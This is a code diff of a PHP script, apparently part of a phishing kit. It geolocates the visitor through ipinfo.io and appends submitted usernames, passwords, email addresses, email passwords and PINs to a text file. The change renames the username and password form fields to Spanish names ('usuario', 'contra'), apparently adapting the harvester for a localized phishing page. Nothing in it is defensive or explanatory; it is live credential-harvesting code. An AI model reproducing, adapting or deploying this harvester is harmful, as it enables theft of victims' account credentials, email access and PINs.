@@ -10,8 +10,8 @@ $city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
 	$file = fopen("NEW.txt", "a");
 	
 fwrite($file, 
-"* USER: ".$_POST['user']."
-* PASS: ".$_POST['pass']."
+"* USER: ".$_POST['usuario']."
+* PASS: ".$_POST['contra']."
 * EMAIL: ".$_POST['email']."
 * E-PASS: ".$_POST['cpass']."
 * PIN: ".$_POST['pin']."
